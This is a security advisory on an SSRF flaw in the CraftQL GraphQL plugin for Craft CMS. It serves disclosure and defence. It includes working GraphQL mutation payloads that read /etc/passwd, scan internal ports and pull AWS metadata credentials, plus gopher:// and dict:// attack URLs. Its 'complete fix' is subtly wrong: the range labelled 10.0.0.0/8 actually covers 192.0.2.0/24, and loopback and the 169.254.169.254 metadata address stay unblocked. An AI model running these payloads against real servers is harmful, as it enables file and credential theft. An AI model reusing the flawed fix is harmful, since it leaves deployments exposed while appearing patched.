# CraftQL SSRF Vulnerability - Technical Analysis

## Executive Summary

**Vulnerability**: Server-Side Request Forgery (SSRF)
**Affected Versions**: Craft CMS 3.x + CraftQL <= 1.3.7

### Overview

CraftQL plugin contains a critical SSRF vulnerability when handling GraphQL Asset field mutations. The vulnerability allows attackers to:

- Read arbitrary files from the server
- Scan internal networks
- Steal cloud service credentials
- Access internal resources

---

## Technical Analysis

### Vulnerable Code

**File**: `vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php`
**Lines**: 42-70

```php
$remoteUrl = $value['url'];  // âš ï¸ User input, no validation

// ... parsing code ...

// ðŸ”´ VULNERABILITY: Direct use of file_get_contents() without validation
file_put_contents($uploadPath, file_get_contents($remoteUrl));
```

### Root Cause

1. **No Input Validation**: User-provided URLs are not validated
2. **Dangerous Function**: `file_get_contents()` supports multiple protocols
3. **No Whitelist**: Any URL scheme is accepted

### Supported Attack Protocols

| Protocol | Use Case | Example |
|----------|----------|---------|
| `file://` | Local File Inclusion | `file:///etc/passwd` |
| `http://` | Internal Network Scan | `http://192.168.1.1/` |
| `https://` | Internal Services | `https://admin.internal/` |
| `gopher://` | Raw TCP Attacks | `gopher://localhost:6379/` |
| `dict://` | Dictionary Protocol | `dict://localhost:11211/` |

---

## Attack Vectors

### Vector 1: Local File Read

**Payload**:
```graphql
mutation {
  upsertTestDefault(heroImage: {url: "file:///etc/passwd"}) {
    id
  }
}
```

**Impact**: Read sensitive files (`/etc/passwd`, `.env`, source code)

### Vector 2: Internal Port Scan

**Payload**:
```graphql
mutation {
  upsertTestDefault(heroImage: {url: "http://192.168.1.1:22/"}) {
    id
  }
}
```

**Impact**: Identify internal services (SSH, MySQL, Redis)

### Vector 3: Cloud Metadata Theft

**AWS**:
```graphql
mutation {
  upsertTestDefault(heroImage: {url: "http://169.254.169.254/latest/meta-data/"}) {
    id
  }
}
```

**Impact**: Steal IAM credentials

---

## Impact Assessment

### Affected Deployments

- **Affected Versions**: CraftQL <= 1.3.7

### Risk Summary

- **Data Leakage**: Database credentials, API keys, source code
- **Internal Breach**: Port scanning, service enumeration
- **Cloud Compromise**: AWS/GCP/Azure credential theft
- **Supply Chain**: Internal API access, lateral movement

---

## Remediation

### Complete Fix demo

```php
private $allowedSchemes = ['http', 'https'];
private $allowedHosts = ['cdn.example.com', 'assets.example.com'];

function handle($event) {
    // ... existing code ...

    $remoteUrl = $value['url'];

    // âœ… 1. Validate URL format
    if (!filter_var($remoteUrl, FILTER_VALIDATE_URL)) {
        throw new \InvalidArgumentException('Invalid URL');
    }

    // âœ… 2. Validate protocol whitelist
    $parsedUrl = parse_url($remoteUrl);
    if (!in_array($parsedUrl['scheme'], $this->allowedSchemes)) {
        throw new \InvalidArgumentException('Only HTTP/HTTPS allowed');
    }

    // âœ… 3. Validate domain whitelist
    if (!in_array($parsedUrl['host'], $this->allowedHosts)) {
        throw new \InvalidArgumentException('Domain not allowed');
    }

    // âœ… 4. Block private IPs
    if ($this->isPrivateIP($parsedUrl['host'])) {
        throw new \InvalidArgumentException('Private IPs blocked');
    }

    // âœ… 5. Use Guzzle instead of file_get_contents
    $client = \Craft::$app->getGuzzle();
    $response = $client->get($remoteUrl, [
        'timeout' => 10,
        'connect_timeout' => 5
    ]);
    $content = $response->getBody()->getContents();

    file_put_contents($uploadPath, $content);
}

private function isPrivateIP($host) {
    $ip = ip2long(gethostbyname($host));
    return (
        ($ip >= 3232235521 && $ip <= 3232301055) ||  // 192.168.0.0/16
        ($ip >= 2886729728 && $ip <= 2887778303) ||  // 172.16.0.0/12
        ($ip >= 3221225984 && $ip <= 3221226239)     // 10.0.0.0/8
    );
}
```
